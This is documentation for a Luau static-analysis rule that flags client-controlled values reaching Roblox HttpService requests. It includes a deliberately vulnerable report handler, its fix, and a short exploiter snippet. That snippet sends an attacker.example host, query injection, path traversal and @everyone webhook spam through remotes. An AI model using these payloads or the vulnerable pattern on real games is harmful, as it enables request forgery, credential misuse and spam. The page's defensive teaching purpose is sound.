# luau-shield005: untrusted-http-request

A value controlled by the client is used in the URL, headers or body of an
`HttpService` request without being checked enough, so the client decides
where your server sends requests, or what it sends in your name.

| Severity | Default | Applies to |
| --- | --- | --- |
| high | enabled | server code: Scripts, server modules and every module they reach (replicated or of unknown context); never `*.client.luau` LocalScripts or modules in client folders |

## What it detects

luau-shield005 follows values that come from the client (the parameters of
`OnServerEvent` / `OnServerInvoke` handlers after `player`, values returned by
`InvokeClient`, `player.Chatted` messages, Knit `Client` methods: see
[Sources of untrusted data](../analysis.md#2-sources-of-untrusted-data))
through variables, tables, local functions and required modules
([Propagation](../analysis.md#3-propagation)). It reports a finding when such a
value reaches one of the request methods of `HttpService` without the checks
listed in [What counts as a check](#what-counts-as-a-check).

The receiver is `HttpService`, obtained with `game:GetService("HttpService")`
(stored under any name) or `game.HttpService`. The sinks are:

| Call | Checked as a URL | Checked as headers | Checked as a body |
| --- | --- | --- | --- |
| `HttpService:GetAsync(url, nocache, headers)` | `url` | `headers` | |
| `HttpService:PostAsync(url, data, contentType, compress, headers)` | `url` | `headers` | `data` |
| `HttpService:RequestAsync(options)` | `options.Url`, `options.Method` | `options.Headers` | `options.Body` and any other field |

A URL is held to a stricter standard than headers and a body, because its
characters change the request itself: `?`, `&`, `#`, `/` and `..` add
parameters, cut off the rest of the URL or walk to another route. When the
whole `options` table of `RequestAsync` comes from the client, it is checked
as a URL.

Client values reach a request through concatenation (`..`, `..=`), string
interpolation, `string.format`, and `HttpService:JSONEncode` of a table that
contains them at any depth. Tables (a header table, a JSON payload) are
checked field by field, including fields written with a client-controlled
key:

```lua
local url = API .. "/players/search?name=" .. username
HttpService:GetAsync(url, false, HEADERS)
HttpService:PostAsync(`{GUILD_API}/guilds/{guildId}/members`, body)
HttpService:PostAsync(string.format("%s/codes/%s/redeem", PROMO_API, code), body)
HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode({ content = reason }))

for name, value in extraHeaders do
	headers[name] = value -- the client chooses header names and values
end
HttpService:RequestAsync({ Url = OFFERS_URL, Method = "POST", Headers = headers })
```

The finding is reported on the line of the `GetAsync`, `PostAsync` or
`RequestAsync` call. When the request is made by a helper (for example
`Backend.fetchProfile` in a required module), the finding is on the call
inside the helper, and the client value is the one passed by the remote
handler that called it.

## Why it is dangerous

Your game server is a trusted client of your own backend, of analytics and
issue trackers, and of the Discord webhooks you post to. An exploiter cannot
call `HttpService` from their client, but they can call your remotes with any
arguments, and every unchecked value they send ends up in a request that your
server makes with its own credentials:

```lua
-- Run by the exploiter in their executor, not by your game.
local remotes = game:GetService("ReplicatedStorage").Remotes
remotes.FetchContent:InvokeServer("https://attacker.example/collect") -- any host
remotes.SearchPlayers:InvokeServer("a&limit=100000") -- extra query parameters
remotes.JoinGuild:FireServer("../../admin/guilds/7/disband#") -- another route
remotes.ReportPlayer:FireServer(261, string.rep("@everyone ", 150)) -- webhook spam
```

- **Choosing the host** turns your game servers into an anonymous proxy that
  forwards your API key headers (unless the Secret is restricted to your
  domain) and often returns the response to the exploiter.
- **Rewriting the path or the query** reaches endpoints of your backend you
  never meant to expose (`/admin/...`, drafts, other players' data) with the
  game server's credentials, which most backends trust completely.
- **Choosing headers or body fields** lets the exploiter impersonate other
  players (`X-Player-Id`), inject fake purchases into analytics, or send
  multi-megabyte payloads.
- **Relaying text to a webhook** lets them ping `@everyone` with scam links
  and slurs from your game. Discord deletes the webhook, and the game is
  responsible for the content it relayed.
- **Every request counts** against the server's HttpService limit of 500
  requests per minute. A remote that makes requests on demand lets one
  exploiter break every other HTTP feature of the server; pair this rule with
  a rate limit ([luau-shield007](luau-shield007.md)).

## Vulnerable example

```lua
-- ServerScriptService/Reports.server.luau
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local ReportPlayer = ReplicatedStorage.Remotes.ReportPlayer :: RemoteEvent

local USERS_API = "https://api.example-studio.dev/v2/users"
local API_HEADERS = { ["X-Api-Key"] = HttpService:GetSecret("backend_api_key") }
-- A server Script: clients never see this URL.
local MOD_WEBHOOK = "https://discord.com/api/webhooks/<id>/<token>"
local REPORT_COOLDOWN = 60

local lastReport: { [Player]: number } = {}

ReportPlayer.OnServerEvent:Connect(function(player: Player, username: string, reason: string)
	local now = os.clock()
	if now - (lastReport[player] or -REPORT_COOLDOWN) < REPORT_COOLDOWN then
		return
	end
	lastReport[player] = now
	-- `username: string` is not a check, and a type check alone is not enough.
	if typeof(username) ~= "string" or typeof(reason) ~= "string" then
		return
	end

	local response = HttpService:GetAsync(`{USERS_API}/by-name/{username}`, false, API_HEADERS) -- luau-shield005
	local reported = HttpService:JSONDecode(response)

	local message = `{player.Name} reported {username} ({reported.id}): {reason}`
	HttpService:PostAsync(MOD_WEBHOOK, HttpService:JSONEncode({ content = message })) -- luau-shield005
end)
```

The rate limit keeps the remote from being spammed, but it does not make the
values safe. `username` can be `"x/../../admin/keys"` or `"x?fields=email"`,
which changes what the authenticated `GetAsync` requests, and `reason` can be
thousands of characters of `@everyone` pings relayed to the moderators'
channel once a minute by every account the exploiter owns.

## Fixed example

```lua
-- ServerScriptService/Reports.server.luau
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local ReportPlayer = ReplicatedStorage.Remotes.ReportPlayer :: RemoteEvent

local USERS_API = "https://api.example-studio.dev/v2/users"
local API_HEADERS = { ["X-Api-Key"] = HttpService:GetSecret("backend_api_key") }
-- A server Script: clients never see this URL.
local MOD_WEBHOOK = "https://discord.com/api/webhooks/<id>/<token>"
local REPORT_COOLDOWN = 60
local MAX_REASON_LENGTH = 300

local lastReport: { [Player]: number } = {}

ReportPlayer.OnServerEvent:Connect(function(player: Player, username: unknown, reason: unknown)
	local now = os.clock()
	if now - (lastReport[player] or -REPORT_COOLDOWN) < REPORT_COOLDOWN then
		return
	end
	lastReport[player] = now
	-- A Roblox username: at most 20 letters, digits or "_", and nothing else.
	if typeof(username) ~= "string" or #username > 20 or not username:match("^[%w_]+$") then
		return
	end
	if typeof(reason) ~= "string" or #reason > MAX_REASON_LENGTH then
		return
	end

	local response = HttpService:GetAsync(`{USERS_API}/by-name/{username}`, false, API_HEADERS)
	local reported = HttpService:JSONDecode(response)

	local message = `{player.Name} reported {username} ({reported.id}): {reason}`
	HttpService:PostAsync(MOD_WEBHOOK, HttpService:JSONEncode({
		content = message,
		allowed_mentions = { parse = {} }, -- "@everyone" in a reason stays plain text
	}))
end)
```

`username` now matches a pattern anchored at both ends, which is enough for a
URL (and therefore for the body too): it cannot contain `/`, `?`, `&`, `#` or
`..`. `reason` is a string with a length limit, which is enough for a body,
where `JSONEncode` escapes it, but would not be enough for a URL.
`allowed_mentions` is not something luau-shield checks, but it is what keeps
a 300-character reason from pinging everybody.

When the client only needs to say *which* thing it wants, the most robust fix
is to keep the URL on the server and let the client pick a key:

```lua
local FEEDS: { [string]: string } = {
	patchNotes = "https://content.example-studio.dev/feeds/patch-notes",
	events = "https://content.example-studio.dev/feeds/events",
}

local lastFetch: { [Player]: number } = {}

FetchContent.OnServerInvoke = function(player: Player, feed: string): string?
	local now = os.clock()
	if now - (lastFetch[player] or 0) < 3 then
		return nil
	end
	lastFetch[player] = now
	local url = FEEDS[feed]
	if not url then
		return nil -- unknown feed: no request at all
	end
	return HttpService:GetAsync(url) -- a server value, whatever the key was
end
```

## What counts as a check

A value accumulates *facts* as it passes checks (see
[Checks](../analysis.md#4-checks-sanitizers)). A check only protects the code
that runs after it succeeds: an early `return`, `error(...)`, `assert(...)`,
or the body of an `if` whose condition holds.

In a **URL** (and in the `Method` of `RequestAsync`), a client value is safe
when it is:

- **allow-listed**: `language == "en"`, `FEEDS[feed]` truthy (a server
  table), `table.find(LANGUAGES, language)`, `t.literal(...)`, `t.keyOf(...)`,
  `t.valueOf(...)`. Better still, the URL itself is read from a server table:
  `FEEDS[feed]` is a server value whatever the key;
- matched by a **pattern anchored at both ends**: `code:match("^%w+$")`,
  `string.match(url, "^https://discord%.com/api/webhooks/%d+/[%w_%-]+$")`;
- **URL-encoded**: the result of `HttpService:UrlEncode(x)`. Only the encoded
  value is safe; the original variable is still untrusted;
- a **number**: the result of `tonumber(x)`, or a value that passed
  `typeof(x) == "number"` or `t.number`. No bounds are needed and NaN does not
  matter here (unlike [luau-shield001](luau-shield001.md)): a number
  interpolated into a string only produces digits, `.`, `-`, `e`, `+`, `inf`
  or `nan`;
- a **boolean** that passed a type check;
- **validated**: it passed a validation function that luau-shield analysed, a
  [custom sanitizer](../configuration.md#sanitizers), or an unresolved guard
  whose name starts with `is`, `validate`, `verify`, `check`, `sanitize`,
  `assert` or `ensure` (see
  [Validation functions](../analysis.md#validation-functions)).

In **headers** and a **body**, everything above is accepted, and also:

- a **string with a type check and a length limit**:
  `typeof(msg) == "string" and #msg <= 200`, `string.len(msg) <= 200`,
  `msg:len() <= 200`;
- **filtered text**: the result of `TextService:FilterStringAsync(...)`
  followed by `GetNonChatStringForBroadcastAsync()` (or `GetChatForUserAsync`,
  `GetNonChatStringForUserAsync`).

A table sent as a body or as headers is safe when each client value in it is.

```lua
-- allow-list: the client names a feed, the URL is a server value
local url = FEEDS[feed]
if not url then
	return
end
HttpService:GetAsync(url)

-- anchored pattern: nothing can come before or after the code
if typeof(code) ~= "string" or not code:match("^%w+$") then
	return
end
HttpService:PostAsync(`{PROMO_API}/codes/{code}/redeem`, body)

-- url-encoded: "&", "#", "/" and "?" become %26, %23, %2F and %3F
HttpService:GetAsync(`{API}/players/search?name={HttpService:UrlEncode(username)}`)

-- a number: tonumber returns nil for anything that is not a number
local id = tonumber(guildId)
if not id then
	return
end
HttpService:PostAsync(`{GUILD_API}/guilds/{id}/members`, body)

-- body only: a string with a length limit
assert(typeof(description) == "string" and #description <= 1000, "bug report too long")
HttpService:PostAsync(TRACKER_URL, HttpService:JSONEncode({ body = description }))
```

What is **not** a check:

- **Type annotations.** `function(player, username: string)` receives
  whatever the client sends: Luau types are erased at runtime.
- **A string type check alone.** `typeof(x) == "string"`, `t.string` or
  `tostring(x)` let any characters and any length through.
- **A length limit, in a URL.** `"a&limit=9999"` is only 12 characters.
  Type and length are enough for a body, never for a URL: use `UrlEncode`, an
  anchored pattern, `tonumber` or an allow-list.
- **Partial patterns and substring tests.** `url:match("^https://")`
  (anchored at the start only), `code:match("%w+")` (not anchored),
  `url:find("discord.com/api/webhooks/", 1, true)` or
  `url:sub(1, 8) == "https://"` say something about part of the string;
  `"https://attacker.example/?discord.com/api/webhooks/"` passes all of them.
- **Checks that do not stop the handler.**
  `if #description > 1000 then warn("too long") end` without a `return` lets
  the long description through.
- **`pcall`, rate limits and `allowed_mentions`.** They are good practice,
  but they do not constrain the value.

**Admin-only code is reported as `info`.** A request built from client data
after a permission check on the sender (`if not Admins.isAdmin(player) then
return end`) is downgraded to `info` with "(admin only: ...)" in the message,
and hidden at the default `min-severity`. The URL or body is still unchecked:
a stolen admin account can reach any route of your backend. Run with
`--min-severity info` to review these requests. See
[Guards](../configuration.md#guards) for the checks that count.

## Limitations

- **Valid is not authorized.** A number or an allow-listed key still decides
  *which* resource is requested: `{API}/users/{id}/inventory` with a client
  `id` that passed `tonumber` is not reported, even if the player should only
  see their own inventory. Build such URLs from server values
  (`player.UserId`).
- **Destinations are not judged.** An allow-list that contains the wrong URL,
  or a pattern that accepts any Discord webhook, counts as a check.
- **Hand-built bodies.** A string with a length limit is enough for a body
  because the body is expected to be encoded with `JSONEncode`. A body built
  by concatenation, such as `'{"text":"' .. msg .. '"}'`, lets a 100-character
  message close the string and add fields, and is not reported. Always encode
  with `HttpService:JSONEncode`.
- **Other arguments and APIs.** The `contentType` and `compress` arguments of
  `PostAsync` are not checked. Other ways of sending data out of the game
  (`MessagingService:PublishAsync`, HTTP wrappers from packages, which are
  never analysed) are not sinks of this rule; declare your own wrappers with a
  [`[[sinks]]`](../configuration.md#sinks) entry (`rule = "luau-shield005"`).
- **Responses are server data.** What `GetAsync`, `PostAsync` and
  `RequestAsync` return is trusted, even when your backend echoes text that
  a player stored earlier.
- **Values stored for later.** A client value put in a queue or a
  module-level table by one handler and sent later by a loop or another
  handler (batched analytics, for example) is not followed (see
  [Limits](../analysis.md#6-limits)). Check values in the handler that
  receives them.
- **Unknown functions.** The result of a call to an unresolved function is
  considered client-controlled when one of its arguments is, which can cause
  false positives, for example with your own URL-encoding helper from a
  package; declare it as a [sanitizer](../configuration.md#sanitizers).

## Suppressing

Suppress a single finding with a comment and a reason, at the end of the
reported line or on the line directly above it (see
[Suppressing findings](../configuration.md#suppressing-findings)):

```lua
HttpService:PostAsync(url, body) -- luau-shield-ignore: luau-shield005 url is signed by the server and verified by LinkTokens

-- luau-shield-ignore: luau-shield005 admin-only debug panel, gated by the group rank check above
local response = HttpService:RequestAsync(request)
```

Suppress the rule for a whole file with a comment at the top of the file:

```lua
-- luau-shield-ignore-file: luau-shield005 HTTP tools of the private test place
```

Turn the rule off in `luau-shield.toml` (or for one run with
`luau-shield check src --disable luau-shield005`):

```toml
[rules]
luau-shield005 = "off"
```

When the analyzer misses one of your own helpers, declaring it as a
[sanitizer](../configuration.md#sanitizers) is better than turning the rule
off. For a helper that URL-encodes its argument:

```toml
[[sanitizers]]
function = "Url.encode"
checks = ["encoded"]
```
